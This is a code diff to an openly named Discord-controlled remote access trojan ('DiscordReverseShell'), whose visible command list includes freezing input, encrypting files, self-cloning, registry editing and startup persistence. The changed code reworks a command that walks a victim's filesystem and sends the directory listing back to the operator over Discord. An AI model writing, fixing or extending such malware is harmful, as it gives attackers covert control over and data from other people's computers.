@@ -188,7 +188,7 @@ commands = "\n\r".join([
     "freeze <1/0> - Freeze all inputs from keyboard and mouse",
     "decrypt <key or keys separated by commas(",") without spaces> <file> - Decrypt an file",
     "encrypt <number of times to encrypt> <file> - Encrypt an file",
-    "fs - FS explorer, optional: fs <path>",
+    "tree - FS Tree, optional: tree <path>",
     "clone <path> - Clone the malware to the specified path, make sure to enter path whit name of the output file",
     "regedit <1 / 2 / 3> <key path> <value name> OR regedit 2 <key path> <value name> <value type: string / expandable_string / multi_string / dword / qword / binary> <value data> - Regedit: 1 - Show value, 2 - Create value, 3 - Delete value",
     "!restart - Restart the malware",
@@ -1076,33 +1076,34 @@ async def on_message(message):
         return
 
 
-#! FILE EXPLORER
-    elif message.content.startswith("fs"):
+#! TREE
+    elif message.content.startswith("tree"):
 
-        path = message.content[3:]
-        if os.path.isdir(path): 
+        path = os.getcwd() if not message.content[5:] else message.content[5:]
+        
+        if not os.path.isdir(path): 
             await message.reply("Invalid path!")
             return
 
-        dir = list_dir(os.getcwd() if not path else path)
+        dir = list_dir(path)
 
         if len(dir) > 1500 and len(dir) < 5000:
             open(f"{os.getenv('temp')}/dir.txt", "w", encoding="utf8").write(dir)
 
             file = discord.File(f"{os.getenv('temp')}/dir.txt")
 
-            embed = discord.Embed(title="FS Explorer",  description="```FS explorer```", color=0xfafafa)
+            embed = discord.Embed(title="FS Tree",  description="```FS Tree```", color=0xfafafa)
             embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
             await message.reply(embed=embed, file=file)
 
             return
         elif len(dir) < 1500:
-            embed = discord.Embed(title="FS Explorer",  description=f"```{dir}```", color=0xfafafa)
+            embed = discord.Embed(title="FS Tree",  description=f"```{dir}```", color=0xfafafa)
             embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
             await message.reply(embed=embed) 
 
         else:
-            embed = discord.Embed(title="FS Explorer - Error",  description="```Scan too big!```", color=0xfafafa)
+            embed = discord.Embed(title="FS Tree - Error",  description="```Scan too big!```", color=0xfafafa)
             embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
             await message.reply(embed=embed) 
 
@@ -1185,5 +1186,4 @@ if check_internet():
         except:
             pass
 else: Startup(sys.argv[0])
-
 
